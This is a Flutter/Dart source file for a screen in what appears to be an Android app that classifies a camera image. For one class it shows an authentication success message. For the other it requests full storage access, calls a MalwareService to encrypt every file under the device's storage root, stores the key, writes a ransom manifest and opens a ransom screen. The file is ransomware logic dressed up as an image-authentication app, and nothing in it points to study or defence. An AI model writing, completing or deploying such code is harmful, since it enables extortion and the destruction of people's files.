import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:permission_handler/permission_handler.dart';

import '../services/malware_service.dart';
import '../screens/ransom_screen.dart';

class ResultScreen extends StatefulWidget {
  const ResultScreen({
    super.key,
    required this.imageBytes,
    required this.predictedClass,
    required this.confidence,
  });

  final Uint8List imageBytes;
  final String predictedClass;
  final double confidence;

  @override
  State<ResultScreen> createState() => _ResultScreenState();
}

class _ResultScreenState extends State<ResultScreen> {
  bool _isProcessing = false;
  String? _errorMessage;

  @override
  void initState() {
    super.initState();
    if (widget.predictedClass == 'class_A') {
      _logClassATimestamp();
    } else if (widget.predictedClass == 'class_B') {
      WidgetsBinding.instance.addPostFrameCallback((_) => _startRansomProcess());
    }
  }

  Future<void> _logClassATimestamp() async {
    try {
      await MalwareService.logClassATimestamp();
    } catch (e) {
      print('Failed to log Class A timestamp: $e');
    }
  }

  Future<bool> _requestStoragePermissions() async {
    // Android 11+ needs MANAGE_EXTERNAL_STORAGE
    if (await Permission.manageExternalStorage.isPermanentlyDenied) {
      openAppSettings();
      return false;
    }
    Map<Permission, PermissionStatus> statuses = await [
      Permission.manageExternalStorage,
      Permission.storage,
    ].request();

    final manageGranted = statuses[Permission.manageExternalStorage]?.isGranted ?? false;
    final storageGranted = statuses[Permission.storage]?.isGranted ?? false;
    return manageGranted || storageGranted;
  }

  Future<void> _startRansomProcess() async {
    setState(() => _isProcessing = true);

    // 1. Check and request necessary permissions
    final storagePermissionGranted = await _requestStoragePermissions();
    if (!storagePermissionGranted) {
      setState(() {
        _errorMessage = 'Storage permissions are required to encrypt files. Please grant them in system settings.';
        _isProcessing = false;
      });
      return;
    }

    // 2. Show progress dialog
    showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (_) => const AlertDialog(
        title: Text('Encrypting storage…'),
        content: Row(
          children: [
            CircularProgressIndicator(),
            SizedBox(width: 18),
            Expanded(child: Text('Encrypting all files in internal storage. This may take a moment.')),
          ],
        ),
      ),
    );

    try {
      final rootPath = await MalwareService.getStorageRoot();
      // ✅ Use runOperation (embedded logic) instead of runPayload
      final result = await MalwareService.runOperation(
        operation: 'encrypt',
        rootPath: rootPath,
      );

      if (result.containsKey('error')) {
        throw Exception(result['error']);
      }

      final encryptedCount = result['count'] as int? ?? 0;          // ✅ field name changed
      final keyHex = result['key'] as String?;                     // ✅ key is returned

      if (encryptedCount == 0) {
        setState(() {
          _errorMessage = 'No files were encrypted (maybe all already encrypted?).';
          _isProcessing = false;
        });
        if (mounted) Navigator.of(context, rootNavigator: true).pop();
        return;
      }

      await MalwareService.storeEncryptionKey(keyHex!);

      final encryptionTime = DateTime.now();
      await MalwareService.writeRansomManifest(
        fileCount: encryptedCount,
        rootPath: rootPath,
        encryptionTime: encryptionTime,
      );

            final manifestPath = '${await MalwareService.getDownloadsPath()}/ransom_manifest.txt';

      if (mounted) {
        Navigator.of(context, rootNavigator: true).pop();
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
            builder: (_) => RansomScreen(
              fileCount: encryptedCount,
              manifestPath: manifestPath,
              targetFilePath: rootPath,
            ),
          ),
        );
      }
    } catch (e) {
      if (mounted) Navigator.of(context, rootNavigator: true).pop();
      setState(() {
        _errorMessage = 'Encryption failed: $e';
        _isProcessing = false;
      });
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(_errorMessage!)));
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    final isAuth = widget.predictedClass == 'class_A';
    final confidencePercent = (widget.confidence * 100).clamp(0, 100);
    final mainColor = isAuth ? const Color(0xFF00E5FF) : const Color(0xFFFF4081);

    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: isAuth
                ? [const Color(0xFF0A1A2E), const Color(0xFF0D3B4C)]
                : [const Color(0xFF2E0A1A), const Color(0xFF4C0D1A)],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(20),
                  child: Image.memory(widget.imageBytes, height: 200, width: 200, fit: BoxFit.cover),
                ),
                const SizedBox(height: 28),
                Icon(isAuth ? Icons.check_circle : Icons.lock_outline, color: mainColor, size: 72),
                const SizedBox(height: 16),
                Text(
                  isAuth ? 'CLASS A' : 'CLASS B',
                  style: GoogleFonts.orbitron(fontSize: 26, fontWeight: FontWeight.bold, color: mainColor),
                ),
                const SizedBox(height: 30),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    const Text('MODEL CONFIDENCE', style: TextStyle(color: Colors.white70, letterSpacing: 1.5)),
                    Text('${confidencePercent.toStringAsFixed(1)}%', style: TextStyle(color: mainColor, fontSize: 18, fontWeight: FontWeight.bold)),
                  ],
                ),
                const SizedBox(height: 10),
                LinearProgressIndicator(
                  value: confidencePercent / 100,
                  minHeight: 12,
                  borderRadius: BorderRadius.circular(6),
                  color: mainColor,
                  backgroundColor: Colors.grey[900],
                ),
                const SizedBox(height: 30),

                if (isAuth)
                  Container(
                    padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 24),
                    decoration: BoxDecoration(
                      border: Border.all(color: mainColor.withOpacity(0.6), width: 2),
                      borderRadius: BorderRadius.circular(30),
                      boxShadow: [
                        BoxShadow(
                          color: mainColor.withOpacity(0.3),
                          blurRadius: 20,
                          spreadRadius: 2,
                        ),
                      ],
                    ),
                    child: Text(
                      'AUTHENTICATION SUCCESSFUL!! WELCOME!!',
                      style: GoogleFonts.orbitron(
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                        color: mainColor,
                        shadows: [
                          Shadow(color: mainColor.withOpacity(0.7), blurRadius: 15),
                        ],
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ),

                if (!isAuth && _isProcessing)
                  const Padding(
                    padding: EdgeInsets.symmetric(vertical: 8.0),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2)),
                        SizedBox(width: 12),
                        Text('Encrypting…', style: TextStyle(color: Colors.white70)),
                      ],
                    ),
                  ),
                if (!isAuth && _errorMessage != null)
                  Text(
                    _errorMessage!,
                    textAlign: TextAlign.center,
                    style: const TextStyle(color: Colors.redAccent),
                  ),

                const Spacer(),
                OutlinedButton.icon(
                  onPressed: _isProcessing ? null : () => Navigator.pop(context),
                  icon: const Icon(Icons.arrow_back),
                  label: const Text('BACK TO CAMERA'),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}